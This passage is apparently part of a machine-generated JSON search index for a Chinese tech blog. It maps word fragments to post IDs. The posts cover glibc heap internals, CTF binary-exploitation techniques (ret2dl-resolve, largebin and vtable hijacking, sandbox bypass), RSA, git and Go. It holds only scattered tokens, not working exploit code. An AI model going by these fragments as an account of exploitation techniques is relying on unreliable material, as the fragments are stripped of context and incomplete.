的文章\",{\"1\":{\"6\":1,\"149\":1}}],[\"如颜色代码\",{\"1\":{\"464\":1}}],[\"如值存在\",{\"1\":{\"254\":1}}],[\"如何解释序列和字段分隔符\",{\"1\":{\"466\":1}}],[\"如何查\",{\"0\":{\"333\":1}}],[\"如何实现\",{\"1\":{\"325\":1}}],[\"如何从\",{\"1\":{\"272\":1}}],[\"如何降低docker里面的gcc版本\",{\"1\":{\"256\":1}}],[\"如何使用\",{\"1\":{\"108\":1}}],[\"如何安装\",{\"1\":{\"108\":1}}],[\"如何调试\",{\"0\":{\"86\":1,\"226\":1}}],[\"如何保护一个进程不被\",{\"0\":{\"69\":1,\"209\":1}}],[\"如文件描述符\",{\"1\":{\"43\":1,\"183\":1}}],[\"如果字符串长度小于等于所需长度\",{\"1\":{\"503\":1}}],[\"如果free则是free\",{\"1\":{\"491\":1}}],[\"如果文件内容能够在一屏内显示完毕\",{\"1\":{\"464\":1}}],[\"如果文件头中存在pt\",{\"1\":{\"454\":1}}],[\"如果此值为\",{\"1\":{\"458\":1}}],[\"如果大小合适会直接从这三十个slot中分配\",{\"1\":{\"438\":1}}],[\"如果验证失败则中止进程\",{\"1\":{\"428\":1}}],[\"如果要详细了解一下就看文章后面调试深入理解部分的内容\",{\"1\":{\"402\":1}}],[\"如果只是想要懂个流程就是浏览一下这部分就行\",{\"1\":{\"402\":1}}],[\"如果只想看重点就直接跳转到largebin入链操作\",{\"1\":{\"308\":1}}],[\"如果直接将fd填写为tls处地址\",{\"1\":{\"378\":1,\"500\":1}}],[\"如果空闲链表中有该分配区\",{\"1\":{\"352\":1}}],[\"如果成功则加锁\",{\"1\":{\"351\":1}}],[\"如果无的话\",{\"1\":{\"349\":1}}],[\"如果存在直接加锁\",{\"1\":{\"349\":1}}],[\"如果下一块chunk是top\",{\"1\":{\"343\":1}}],[\"如果下一个chunk不为top\",{\"1\":{\"324\":1}}],[\"如果一样提示double\",{\"1\":{\"342\":1}}],[\"如果一个大小的chunk链表中有多个chunk\",{\"1\":{\"321\":1}}],[\"如果一个线程崩溃了就会导致内存有错误\",{\"1\":{\"66\":1,\"206\":1}}],[\"如果一个线程挂了就会导致全部线程崩溃\",{\"1\":{\"66\":1,\"206\":1}}],[\"如果size小于get\",{\"1\":{\"335\":1}}],[\"如果现在我们能够修改largebin中fwd位置的chunk\",{\"1\":{\"325\":1}}],[\"如果当前chunk的p为0也就是下一个chunk为freechunk则进行合并\",{\"1\":{\"324\":1}}],[\"如果当前chunk比最后一位chunk还小则直接加入链表末尾\",{\"1\":{\"319\":1}}],[\"如果通过nextchunk查看下一个chunk是free状态\",{\"1\":{\"324\":1}}],[\"如果取出来的chunk下一个chunk也是free\",{\"1\":{\"324\":1}}],[\"如果前一个chunk空闲\",{\"1\":{\"324\":1}}],[\"如果释放的chunk不属于fastbin\",{\"1\":{\"324\":1}}],[\"如果topchunk不够就去系统申请\",{\"1\":{\"323\":1}}],[\"如果没找到就去topchunk分配\",{\"1\":{\"323\":1}}],[\"如果没有指定文件\",{\"1\":{\"464\":1}}],[\"如果没有则加到对齐\",{\"1\":{\"289\":1}}],[\"如果没有设置\",{\"1\":{\"254\":1}}],[\"如果没有设置值\",{\"1\":{\"254\":1}}],[\"如果没有该属性或者方法就会去原型对象上面查找\",{\"1\":{\"84\":1,\"224\":1}}],[\"如果切割的chunk\",{\"1\":{\"321\":1}}],[\"如果该chunk与当前chunk相同则让chunk插入fwd之后\",{\"1\":{\"319\":1}}],[\"如果属于large\",{\"1\":{\"319\":1}}],[\"如果属于small\",{\"1\":{\"318\":1}}],[\"如果开启了tcache机制\",{\"1\":{\"315\":1}}],[\"如果开了分页机制\",{\"1\":{\"21\":1,\"163\":1}}],[\"如果chunk和当前需要的chunk大小一致\",{\"1\":{\"315\":1}}],[\"如果checkorigin为nil\",{\"1\":{\"254\":1}}],[\"如果符合条件\",{\"1\":{\"313\":1}}],[\"如果\",{\"1\":{\"312\":2,\"352\":1}}],[\"如果小于则直接等于0x20\",{\"1\":{\"289\":1}}],[\"如果有合适的就直接给\",{\"1\":{\"330\":1}}],[\"如果有关联的issue就把issue的编号写出来\",{\"1\":{\"266\":1}}],[\"如果有多个调用者\",{\"1\":{\"8\":1,\"150\":1}}],[\"如果为top\",{\"1\":{\"324\":1}}],[\"如果为\",{\"1\":{\"255\":1}}],[\"如果不关心退出状态\",{\"1\":{\"458\":1}}],[\"如果不存在dt\",{\"1\":{\"453\":1}}],[\"如果不检查\",{\"1\":{\"254\":1}}],[\"如果不指定就会自动分配\",{\"1\":{\"254\":1}}],[\"如果origin请求头存在且原始主机不等于请求主机头\",{\"1\":{\"254\":1}}],[\"如果请求origin标头可以接受\",{\"1\":{\"254\":1}}],[\"如果是主线程\",{\"1\":{\"351\":1}}],[\"如果是fastbin区间的\",{\"1\":{\"324\":1}}],[\"如果是remiander\",{\"1\":{\"321\":1}}],[\"如果是在需要依赖那么请用抽象层将它们隔离开\",{\"1\":{\"252\":1}}],[\"如果是非叶子函数\",{\"1\":{\"49\":1,\"189\":1}}],[\"如果我们在a数据变化的时候去直接调用b和c的显示函数\",{\"1\":{\"250\":1}}],[\"如果两个或两个以上的整数的最大公约数是1\",{\"1\":{\"240\":1}}],[\"如果a不是p的质数的话\",{\"1\":{\"239\":1}}],[\"如果最自己本身具备就不会去找原型\",{\"1\":{\"84\":1,\"224\":1}}],[\"如果找到不到就一直向上寻找直到最顶层的object\",{\"1\":{\"84\":1,\"224\":1}}],[\"如果32位操作系统的情况下\",{\"1\":{\"71\":1,\"211\":1}}],[\"如果4g物理内存的机子上面申请8g内存会怎样\",{\"0\":{\"71\":1,\"211\":1}}],[\"如果已经被程序修改过了\",{\"1\":{\"68\":1,\"208\":1}}],[\"如果unsortedbin中chunk有一个chunk属于largebin的范围\",{\"1\":{\"57\":1,\"197\":1}}],[\"如果版本较高我们需要计算并且构造好size区域\",{\"1\":{\"55\":1,\"195\":1}}],[\"如果这个参数为1\",{\"1\":{\"41\":1,\"181\":1}}],[\"如果标志位发生了改变\",{\"1\":{\"20\":1,\"162\":1}}],[\"如果马上调用exec加载新的程序\",{\"1\":{\"16\":1,\"158\":1}}],[\"如同页表基址寄存器的功能一样\",{\"1\":{\"10\":1,\"152\":1}}],[\"如内存或磁盘上的数据存储\",{\"1\":{\"8\":1,\"150\":1}}],[\"快照就用了cow\",{\"1\":{\"8\":1,\"150\":1}}],[\"华为\",{\"1\":{\"8\":1,\"150\":1}}],[\"r8d\",{\"1\":{\"483\":1}}],[\"r9d\",{\"1\":{\"483\":1}}],[\"rip=syscall\",{\"1\":{\"505\":4}}],[\"rip\",{\"1\":{\"483\":1}}],[\"rivest\",{\"1\":{\"238\":1}}],[\"rb=\",{\"1\":{\"481\":1}}],[\"rbp+24\",{\"1\":{\"483\":2}}],[\"rbp\",{\"1\":{\"446\":1,\"459\":6,\"469\":2,\"470\":1,\"473\":2}}],[\"rpath\",{\"1\":{\"453\":1,\"456\":2}}],[\"rdi=1\",{\"1\":{\"505\":1}}],[\"rdi=3\",{\"1\":{\"505\":1}}],[\"rdi=bss\",{\"1\":{\"505\":1}}],[\"rdi=0\",{\"1\":{\"505\":1}}],[\"rdi+p64\",{\"1\":{\"503\":4,\"504\":2}}],[\"rdi\",{\"1\":{\"449\":1,\"483\":10,\"503\":1,\"504\":1}}],[\"rdx=0x36\",{\"1\":{\"505\":2}}],[\"rdx=0x700\",{\"1\":{\"505\":1}}],[\"rdx=0\",{\"1\":{\"505\":1}}],[\"rdx+p64\",{\"1\":{\"504\":2}}],[\"rdx\",{\"1\":{\"311\":1,\"449\":2,\"483\":1,\"503\":4,\"504\":1}}],[\"rw\",{\"1\":{\"404\":1}}],[\"ru\",{\"1\":{\"369\":1,\"380\":1,\"473\":5,\"475\":6,\"479\":2,\"480\":6,\"481\":3,\"482\":2,\"483\":5,\"484\":6,\"486\":2,\"488\":7,\"491\":11,\"502\":1,\"503\":15,\"504\":2,\"505\":1}}],[\"runpath会ld忽略ld\",{\"1\":{\"453\":1}}],[\"runpath再去寻找dt\",{\"1\":{\"453\":1}}],[\"runpath\",{\"1\":{\"453\":1}}],[\"running\",{\"1\":{\"258\":2}}],[\"run\",{\"1\":{\"256\":1,\"258\":2}}],[\"runtime\",{\"0\":{\"450\":1},\"1\":{\"36\":1,\"176\":1,\"449\":8,\"450\":2}}],[\"rl\",{\"1\":{\"369\":1,\"473\":2,\"475\":1,\"479\":1,\"480\":2,\"481\":2,\"482\":1,\"483\":1,\"484\":3,\"486\":1,\"488\":1,\"491\":1,\"503\":2,\"504\":1,\"505\":1}}],[\"rcx\",{\"1\":{\"449\":2,\"483\":5,\"503\":1}}],[\"rc\",{\"1\":{\"369\":1,\"473\":1,\"475\":2,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":2,\"491\":2,\"503\":2,\"504\":1,\"505\":1}}],[\"rsp+p64\",{\"1\":{\"503\":1}}],[\"rsp+2ch\",{\"1\":{\"469\":1,\"470\":1}}],[\"rsp+28h\",{\"1\":{\"459\":1}}],[\"rsp+20h\",{\"1\":{\"459\":1}}],[\"rsp+18h\",{\"1\":{\"459\":1}}],[\"rsp+10h\",{\"1\":{\"459\":1}}],[\"rsp+4h\",{\"1\":{\"459\":1}}],[\"rsp+0h\",{\"1\":{\"459\":1,\"469\":1}}],[\"rsp向下跑一下\",{\"1\":{\"446\":1}}],[\"rsp向下移动一格\",{\"1\":{\"446\":1}}],[\"rsp\",{\"1\":{\"446\":1,\"449\":1,\"473\":1,\"483\":2,\"503\":1,\"505\":4}}],[\"rsp定位的\",{\"1\":{\"446\":1}}],[\"rsi=0\",{\"1\":{\"505\":1}}],[\"rsi=bss+0x400\",{\"1\":{\"505\":2}}],[\"rsi=bss\",{\"1\":{\"505\":1}}],[\"rsi+p64\",{\"1\":{\"503\":4,\"504\":2}}],[\"rsi\",{\"1\":{\"311\":1,\"449\":2,\"483\":7,\"503\":1,\"504\":1}}],[\"rsa中通常还有个签名消息也就是校验码\",{\"1\":{\"243\":1}}],[\"rsa的难点就在于大数的因式分解\",{\"1\":{\"241\":1}}],[\"rsa加密安全性受到了挑战\",{\"1\":{\"238\":1}}],[\"rsa是目前最有影响力的公钥加密算法\",{\"1\":{\"238\":1}}],[\"rsa就是他们三人姓氏开头字母拼在一起组成的\",{\"1\":{\"238\":1}}],[\"rsa公钥加密算法是1977年由罗纳德\",{\"1\":{\"238\":1}}],[\"rsa算法是现今使用最广泛的公钥密码算法\",{\"1\":{\"238\":1}}],[\"rsa算法基于一个十分简单的数论事实\",{\"1\":{\"238\":1}}],[\"rsa算法\",{\"0\":{\"237\":1}}],[\"rtt\",{\"1\":{\"261\":1}}],[\"rfc\",{\"1\":{\"254\":1}}],[\"rncallpythonretobj\",{\"1\":{\"134\":1}}],[\"raw\",{\"1\":{\"464\":1}}],[\"rax=1\",{\"1\":{\"505\":1}}],[\"rax=2\",{\"1\":{\"505\":1}}],[\"rax=0\",{\"1\":{\"505\":2}}],[\"rax\",{\"1\":{\"449\":5,\"470\":3,\"473\":4,\"483\":15}}],[\"ra\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"random\",{\"1\":{\"342\":1}}],[\"randomization\",{\"1\":{\"74\":1,\"214\":1}}],[\"range\",{\"1\":{\"281\":2,\"305\":1,\"313\":2,\"318\":1,\"320\":1,\"321\":1,\"324\":1,\"344\":1,\"358\":3,\"359\":2,\"373\":2,\"376\":3,\"378\":4,\"380\":8,\"475\":6,\"480\":1,\"488\":8,\"491\":8,\"495\":2,\"498\":3,\"500\":4,\"502\":8,\"503\":22}}],[\"rabbitmq\",{\"0\":{\"100\":1}}],[\"ram\",{\"1\":{\"73\":1,\"213\":1}}],[\"rodata\",{\"1\":{\"470\":1}}],[\"roderickchan\",{\"1\":{\"53\":1,\"193\":1,\"262\":1}}],[\"roderick\",{\"1\":{\"53\":1,\"193\":1}}],[\"routine\",{\"1\":{\"458\":3}}],[\"ropgadget\",{\"1\":{\"445\":1}}],[\"rol\",{\"1\":{\"380\":2,\"502\":2,\"503\":2}}],[\"ron\",{\"1\":{\"238\":1}}],[\"rocketmq\",{\"0\":{\"101\":1}}],[\"root\",{\"1\":{\"261\":2}}],[\"root=\",{\"1\":{\"73\":1,\"213\":1}}],[\"rootfs\",{\"1\":{\"73\":6,\"213\":6}}],[\"row快照技术原理\",{\"1\":{\"8\":1,\"150\":1}}],[\"r5\",{\"1\":{\"52\":1,\"192\":1}}],[\"r2\",{\"1\":{\"47\":3,\"187\":3}}],[\"r3寄存器传递\",{\"1\":{\"47\":1,\"187\":1}}],[\"r0\",{\"1\":{\"47\":2,\"187\":2}}],[\"r0存储float返回值\",{\"1\":{\"47\":1,\"187\":1}}],[\"r10\",{\"1\":{\"311\":1,\"483\":3}}],[\"r1\",{\"1\":{\"47\":4,\"187\":4}}],[\"r11\",{\"1\":{\"47\":4,\"187\":4,\"311\":2}}],[\"r11作为栈指针用作栈底可用于栈回溯\",{\"1\":{\"47\":1,\"187\":1}}],[\"r1存储double\",{\"1\":{\"47\":1,\"187\":1}}],[\"r15\",{\"1\":{\"47\":1,\"187\":1}}],[\"r14\",{\"1\":{\"47\":1,\"187\":1}}],[\"r13sp栈指针\",{\"1\":{\"47\":1,\"187\":1}}],[\"r12+p64\",{\"1\":{\"503\":3}}],[\"r12\",{\"1\":{\"47\":1,\"187\":1,\"503\":1}}],[\"r7存储系统调用号\",{\"1\":{\"47\":1,\"187\":1}}],[\"r\",{\"1\":{\"36\":1,\"176\":1,\"254\":4,\"358\":17,\"359\":17,\"451\":9,\"464\":1,\"471\":5,\"503\":2}}],[\"rep\",{\"1\":{\"482\":1}}],[\"replace\",{\"1\":{\"397\":1,\"456\":1}}],[\"replaced\",{\"1\":{\"349\":1,\"353\":2}}],[\"repeat\",{\"1\":{\"352\":2}}],[\"repository\",{\"1\":{\"258\":1}}],[\"reused\",{\"0\":{\"354\":1},\"1\":{\"349\":1,\"352\":1,\"353\":1}}],[\"reg\",{\"1\":{\"461\":1,\"470\":1}}],[\"regular\",{\"1\":{\"324\":1}}],[\"register\",{\"1\":{\"43\":2,\"47\":4,\"183\":2,\"187\":4,\"279\":1}}],[\"register所使用的值\",{\"1\":{\"38\":1,\"178\":1}}],[\"reduce\",{\"1\":{\"324\":1}}],[\"redundant\",{\"1\":{\"286\":1}}],[\"redo\",{\"1\":{\"324\":1,\"339\":1}}],[\"rerouted\",{\"1\":{\"321\":1}}],[\"remainder\",{\"0\":{\"321\":1},\"1\":{\"313\":16,\"321\":16,\"347\":2}}],[\"removing\",{\"1\":{\"321\":1}}],[\"remove\",{\"1\":{\"279\":1,\"353\":3,\"380\":2,\"502\":2,\"503\":1}}],[\"remoteaddr\",{\"1\":{\"254\":1}}],[\"remote\",{\"1\":{\"131\":1,\"369\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"revert的注意事项\",{\"0\":{\"275\":1}}],[\"revert的类型\",{\"0\":{\"274\":1}}],[\"revert是用一个新的commit\",{\"1\":{\"273\":1}}],[\"revert和git\",{\"1\":{\"273\":1}}],[\"revert原因\",{\"0\":{\"273\":1}}],[\"revert用法\",{\"1\":{\"272\":1}}],[\"revert\",{\"1\":{\"272\":1,\"274\":2,\"276\":1}}],[\"reviewer\",{\"1\":{\"270\":1}}],[\"review\",{\"0\":{\"269\":1}}],[\"refactor\",{\"1\":{\"265\":1}}],[\"refq和retf详解\",{\"0\":{\"44\":1,\"184\":1}}],[\"recvall\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"recvline\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"recv\",{\"1\":{\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":6,\"486\":1,\"488\":6,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"recvuntil\",{\"1\":{\"358\":6,\"359\":6,\"369\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"recent\",{\"1\":{\"347\":1}}],[\"recently\",{\"1\":{\"347\":1}}],[\"received\",{\"1\":{\"261\":1}}],[\"record\",{\"1\":{\"53\":1,\"193\":1,\"324\":2,\"339\":1}}],[\"reached\",{\"1\":{\"324\":2}}],[\"reasons\",{\"1\":{\"286\":1}}],[\"reason\",{\"1\":{\"254\":1}}],[\"read函数\",{\"1\":{\"483\":1,\"505\":1}}],[\"readfsqword\",{\"1\":{\"459\":1}}],[\"readmessage\",{\"1\":{\"254\":1}}],[\"readme规范学习\",{\"0\":{\"105\":1}}],[\"readbuffersize\",{\"1\":{\"254\":2}}],[\"readv\",{\"1\":{\"43\":1,\"183\":1}}],[\"read\",{\"1\":{\"40\":3,\"41\":1,\"180\":3,\"181\":1,\"349\":1,\"353\":1,\"390\":4,\"395\":6,\"401\":2,\"408\":10,\"410\":3,\"483\":1,\"503\":1,\"504\":1}}],[\"requested\",{\"1\":{\"353\":1}}],[\"request\",{\"1\":{\"254\":3,\"258\":1,\"261\":7,\"347\":1,\"353\":1}}],[\"re\",{\"0\":{\"523\":1},\"1\":{\"131\":1,\"324\":1}}],[\"resolve部分详细解说\",{\"0\":{\"450\":1}}],[\"resolve函数\",{\"1\":{\"449\":2}}],[\"resolve函数也就是got\",{\"1\":{\"36\":1,\"176\":1}}],[\"resolve\",{\"1\":{\"449\":6,\"450\":2}}],[\"reserve\",{\"1\":{\"390\":2,\"408\":2,\"438\":1}}],[\"reset通常是直接删除\",{\"1\":{\"273\":1}}],[\"reset的区别\",{\"1\":{\"273\":1}}],[\"result\",{\"1\":{\"280\":2,\"324\":1,\"481\":3}}],[\"resuming\",{\"1\":{\"131\":1}}],[\"responeswriter主要负责响应的header和响应数据返回给客户端\",{\"1\":{\"254\":1}}],[\"responeswriter接口和request指针\",{\"1\":{\"254\":1}}],[\"responsewriter\",{\"1\":{\"254\":2}}],[\"res\",{\"1\":{\"121\":3,\"123\":3,\"373\":3,\"378\":1,\"380\":6,\"473\":3,\"475\":4,\"479\":2,\"484\":2,\"488\":4,\"491\":6,\"495\":3,\"500\":1,\"502\":6,\"503\":8}}],[\"restrict\",{\"1\":{\"74\":2,\"214\":2}}],[\"ret2\",{\"1\":{\"504\":1}}],[\"ret2dl\",{\"0\":{\"36\":1,\"176\":1,\"447\":1}}],[\"ret指令的地方\",{\"1\":{\"446\":1}}],[\"ret\",{\"1\":{\"446\":2,\"449\":1,\"473\":1,\"504\":1,\"505\":1}}],[\"ret这个gadget将esp劫持到fake\",{\"1\":{\"445\":1}}],[\"retry\",{\"1\":{\"258\":1,\"351\":2}}],[\"retval\",{\"1\":{\"127\":1,\"458\":2}}],[\"retf是从32位转到64位\",{\"1\":{\"44\":1,\"184\":1}}],[\"retfq无法跳转4字节以上的地址\",{\"1\":{\"483\":1}}],[\"retfq\",{\"1\":{\"44\":1,\"184\":1,\"483\":3}}],[\"retf\",{\"1\":{\"44\":1,\"184\":1}}],[\"return\",{\"1\":{\"44\":2,\"121\":1,\"123\":6,\"134\":2,\"136\":1,\"184\":2,\"242\":2,\"243\":2,\"254\":2,\"290\":1,\"305\":1,\"313\":1,\"315\":2,\"322\":1,\"324\":1,\"342\":1,\"351\":1,\"352\":1,\"353\":2,\"358\":1,\"359\":1,\"403\":3,\"419\":1,\"428\":1,\"439\":2,\"441\":2,\"459\":1,\"469\":2,\"470\":1,\"475\":1,\"484\":2,\"488\":1,\"491\":3,\"503\":7}}],[\"retn\",{\"1\":{\"44\":1,\"184\":1}}],[\"ret和retf指令\",{\"1\":{\"44\":1,\"184\":1}}],[\"relro\",{\"1\":{\"469\":2}}],[\"relay\",{\"1\":{\"439\":2,\"441\":2}}],[\"relaxed\",{\"1\":{\"324\":2}}],[\"related\",{\"1\":{\"0\":1}}],[\"release\",{\"1\":{\"270\":1,\"324\":1}}],[\"rel的信息\",{\"1\":{\"36\":1,\"176\":1}}],[\"rel\",{\"1\":{\"36\":1,\"176\":1,\"324\":1,\"339\":1,\"451\":9}}],[\"rel信息\",{\"1\":{\"36\":1,\"176\":1}}],[\"reloc\",{\"0\":{\"451\":1},\"1\":{\"36\":1,\"176\":1,\"449\":4,\"450\":1,\"451\":2}}],[\"四种锁的区别\",{\"0\":{\"7\":1}}],[\"详解mvc设计模式\",{\"1\":{\"246\":1}}],[\"详解\",{\"1\":{\"5\":1,\"148\":1,\"272\":1}}],[\"详细看下方图\",{\"1\":{\"365\":1}}],[\"详细看intent的各种action\",{\"1\":{\"143\":1}}],[\"详细拆分了\",{\"1\":{\"307\":1}}],[\"详细说明intent\",{\"1\":{\"140\":1}}],[\"详细介绍+图片理解\",{\"1\":{\"19\":1,\"161\":1}}],[\"详细\",{\"1\":{\"3\":1,\"146\":1}}],[\"这题利用的一个head\",{\"1\":{\"489\":1}}],[\"这题应该麻烦的是搭建mips环境\",{\"1\":{\"485\":1}}],[\"这题我们拥有两次写入机会\",{\"1\":{\"476\":1}}],[\"这题存在off\",{\"1\":{\"294\":1}}],[\"这特别有用于处理非标准格式的数据\",{\"1\":{\"466\":1}}],[\"这意味着\",{\"1\":{\"466\":1}}],[\"这意味着如果此时去打开一个新的文件\",{\"1\":{\"15\":1,\"157\":1}}],[\"这对于文本解析\",{\"1\":{\"466\":1}}],[\"这就不得不去提及一下那一张很生草但是又形象的图了\",{\"1\":{\"433\":1}}],[\"这俩个大佬提供了两种思路\",{\"1\":{\"372\":1,\"494\":1}}],[\"这两个就比较重要了\",{\"1\":{\"345\":1}}],[\"这两个函数虽然都能够关闭套接字\",{\"1\":{\"4\":1,\"147\":1}}],[\"这后面的操作往往是先让fwd到指定的位置\",{\"1\":{\"316\":1}}],[\"这种就类似于lua中的协程了\",{\"1\":{\"281\":1}}],[\"这种机制显然是不合理的\",{\"1\":{\"10\":1,\"152\":1}}],[\"这是函数的调用约定所以当我们执行完后read函数后\",{\"1\":{\"446\":1}}],[\"这是符合oo设计原则的\",{\"1\":{\"252\":1}}],[\"这是一个简化的示例\",{\"1\":{\"449\":1}}],[\"这是一个由notionnext生成的站点\",{\"1\":{\"1\":1}}],[\"这是一种比较先进的思想\",{\"1\":{\"20\":1,\"162\":1}}],[\"这提高了较高的重用性\",{\"1\":{\"246\":1}}],[\"这提供了低耦合性\",{\"1\":{\"246\":1}}],[\"这也用作设置函数\",{\"1\":{\"47\":2,\"187\":2}}],[\"这也为堆栈帧分配空间\",{\"1\":{\"47\":1,\"187\":1}}],[\"这些物理内存页通过kmap映射到永久映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"这些内存随时有可能再次被访问所以不能直接回收所以会利用swap机制先写入磁盘中\",{\"1\":{\"68\":1,\"208\":1}}],[\"这些就能绕过限制读取flag\",{\"1\":{\"40\":1,\"180\":1}}],[\"这些操作通常包括作为参数传递\",{\"1\":{\"32\":1,\"174\":1}}],[\"这个free\",{\"1\":{\"484\":1}}],[\"这个变量将被填充为新创建线程的线程id\",{\"1\":{\"458\":1}}],[\"这个变量是当前循环到的unsortedbin\",{\"1\":{\"310\":1}}],[\"这个参数\",{\"1\":{\"451\":1}}],[\"这个寄存器是存入的我们下一条执行的指令地址\",{\"1\":{\"446\":1}}],[\"这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域\",{\"1\":{\"482\":1}}],[\"这个指令可以查到当前的窗口的包和目前的class\",{\"1\":{\"133\":1}}],[\"这个指令\",{\"1\":{\"446\":1}}],[\"这个操作\",{\"1\":{\"446\":1}}],[\"这个操作之前的栈结构\",{\"1\":{\"446\":1}}],[\"这个操作十分方便\",{\"1\":{\"55\":1,\"195\":1}}],[\"这个数据主要存着各种函数\",{\"1\":{\"401\":1}}],[\"这个数组到底是怎么存放数据的\",{\"1\":{\"292\":1}}],[\"这个chunk写上我们想要调用的函数\",{\"1\":{\"395\":1}}],[\"这个chunk是以前为了当作跳板的chunk\",{\"1\":{\"378\":1,\"500\":1}}],[\"这个函数必须返回一个\",{\"1\":{\"458\":1}}],[\"这个函数主要是检测了你的vtable是否在合法区域范围之内\",{\"1\":{\"428\":1}}],[\"这个函数存在于\",{\"1\":{\"395\":1}}],[\"这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含\",{\"1\":{\"125\":1}}],[\"这个结构体包含了\",{\"1\":{\"389\":1}}],[\"这个unsortedbin的chunk的大小就会被清空\",{\"1\":{\"358\":1}}],[\"这个构造等于payload的长度\",{\"1\":{\"345\":1}}],[\"这个关系\",{\"1\":{\"310\":1}}],[\"这个是存size的\",{\"1\":{\"292\":1}}],[\"这个是个指针\",{\"1\":{\"36\":1,\"176\":1}}],[\"这个key对应的value也是一个callback函数\",{\"1\":{\"125\":1}}],[\"这个key对应的value是一个callback函数\",{\"1\":{\"125\":1}}],[\"这个方法有什么用呢\",{\"1\":{\"124\":1}}],[\"这个方法较为好用\",{\"1\":{\"55\":1,\"195\":1}}],[\"这个稍微多一步也就是\",{\"1\":{\"73\":1,\"213\":1}}],[\"这个技巧主要是通过off\",{\"1\":{\"55\":1,\"195\":1}}],[\"这个主要是写在源码注释中了\",{\"1\":{\"54\":1,\"194\":1}}],[\"这个虚拟机\",{\"1\":{\"41\":1,\"181\":1}}],[\"这个区域可以访问高端内存\",{\"1\":{\"16\":1,\"158\":1}}],[\"这样可能不方便观察\",{\"1\":{\"431\":1}}],[\"这样方便我们后面使用off\",{\"1\":{\"365\":1}}],[\"这样chunk3\",{\"1\":{\"365\":1}}],[\"这样我们可以轻松构造一个double\",{\"1\":{\"490\":1}}],[\"这样我们可以实现uaf\",{\"1\":{\"489\":1}}],[\"这样我们可以构造一个\",{\"1\":{\"365\":1,\"369\":1}}],[\"这样我们只需要调用file\",{\"1\":{\"401\":1}}],[\"这样我们就可以修改b\",{\"1\":{\"488\":1}}],[\"这样我们就可以针对失败的数据重发包\",{\"1\":{\"433\":1}}],[\"这样我们就可以轻松愉快地劫持vatble了\",{\"1\":{\"395\":1}}],[\"这样我们就可以向content\",{\"1\":{\"375\":1,\"497\":1}}],[\"这样我们malloc下来就可以进行劫持了\",{\"1\":{\"55\":1,\"195\":1}}],[\"这样fd和bk分别指向chunk\",{\"1\":{\"365\":1,\"369\":1}}],[\"这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\",{\"1\":{\"359\":1}}],[\"这样才能切割\",{\"1\":{\"313\":1}}],[\"这样才能实现较高的利用效率\",{\"1\":{\"20\":1,\"162\":1}}],[\"这样修改victim\",{\"1\":{\"306\":1}}],[\"这样在远程服务器的时候就可以利用这个偏移获取libc基地址\",{\"1\":{\"287\":1}}],[\"这样就完成了一次函数的劫持\",{\"1\":{\"396\":1}}],[\"这样就完成了脱链操作\",{\"1\":{\"344\":1}}],[\"这样就会调用\",{\"1\":{\"395\":1}}],[\"这样就能随意控制isused和point了\",{\"1\":{\"374\":1,\"496\":1}}],[\"这样就保留了fd\",{\"1\":{\"365\":1}}],[\"这样就阻止了我们跨chunk进行合并\",{\"1\":{\"303\":1}}],[\"这样就不会堵塞了\",{\"1\":{\"279\":1}}],[\"这样就可以实现栈的移动\",{\"1\":{\"446\":1}}],[\"这样就可以实现循环利用\",{\"1\":{\"354\":1}}],[\"这样就可以实现各个类之间的解耦操作\",{\"1\":{\"245\":1}}],[\"这样就可以实现各个类型的断言转化了\",{\"1\":{\"26\":1,\"168\":1}}],[\"这样就可以伪造elf\",{\"1\":{\"36\":1,\"176\":1}}],[\"这样会导致代码的理解和维护性很差\",{\"1\":{\"252\":1}}],[\"这样其他的层级负责的东西就比较少\",{\"1\":{\"252\":1}}],[\"这样层级之间结构清晰\",{\"1\":{\"252\":1}}],[\"这样每次系统调用就会经过该过滤器\",{\"1\":{\"41\":1,\"181\":1}}],[\"这样新对象修改的时候老对象也会发生变化\",{\"1\":{\"30\":1,\"172\":1}}],[\"这需要做很多工作\",{\"1\":{\"12\":1,\"154\":1}}],[\"这过程对其他的调用者都是透明的\",{\"1\":{\"8\":1,\"150\":1}}],[\"这里随意\",{\"1\":{\"491\":1}}],[\"这里paload偏移32位置\",{\"1\":{\"491\":1}}],[\"这里保留了原本的构思代码\",{\"1\":{\"483\":1}}],[\"这里举列子\",{\"0\":{\"467\":1}}],[\"这里提到ifs作为shell的内置变量\",{\"1\":{\"465\":1}}],[\"这里提及的额外的操作是因为比如32位机子\",{\"1\":{\"12\":1,\"154\":1}}],[\"这里old\",{\"1\":{\"456\":1}}],[\"这里相当于\",{\"1\":{\"449\":1}}],[\"这里相当于让前后的chunk连接起来了\",{\"1\":{\"296\":1}}],[\"这里需要注意eip这个寄存器很特殊\",{\"1\":{\"446\":1}}],[\"这里需要特殊说明\",{\"1\":{\"365\":1}}],[\"这里说一下我自己的浅薄理解\",{\"1\":{\"446\":1}}],[\"这里写了一个大概的源码\",{\"1\":{\"449\":1}}],[\"这里写个小插曲\",{\"1\":{\"445\":1}}],[\